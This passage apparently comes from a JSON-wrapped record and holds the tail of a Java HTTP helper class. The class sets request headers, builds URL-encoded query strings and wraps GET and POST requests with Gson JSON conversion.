{\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    public static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder sb = new StringBuilder();\n        boolean first = true;\n        for (Map.Entry<String, Object> entry : query.entrySet()) {\n            if (!first) {\n                sb.append(\"&\");\n            } else {\n                sb.append(\"?\");\n                first = false;\n            }\n            sb.append(urlEncodeUTF8(entry.getKey())).append(\"=\").append(urlEncodeUTF8(entry.getValue().toString()));\n        }\n        return sb.toString();\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) throws IOException {\n        String response = getRaw(headers, url);\n        Gson gson = new Gson();\n        return gson.fromJson(response, tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) throws IOException {\n        String fullUrl = url + parseQueries(query);\n        return getFullUrl(headers, fullUrl, tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) throws IOException {\n        Gson gson = new Gson();\n        String jsonBody = gson.toJson(body);\n        String response = postRaw(headers, url, jsonBody);\n        return gson.fromJson(response, tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) throws IOException {\n        String fullUrl = url + parseQueries(query);\n        return postFullUrl(headers, fullUrl, body, tClass);\n    }\n\n    public static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\").replaceAll(\"\\\\+\", \"%20\");\n        } catch (UnsupportedEncodingException e) {\n            return input;\n        }\n    }\n}\n```"
  }
]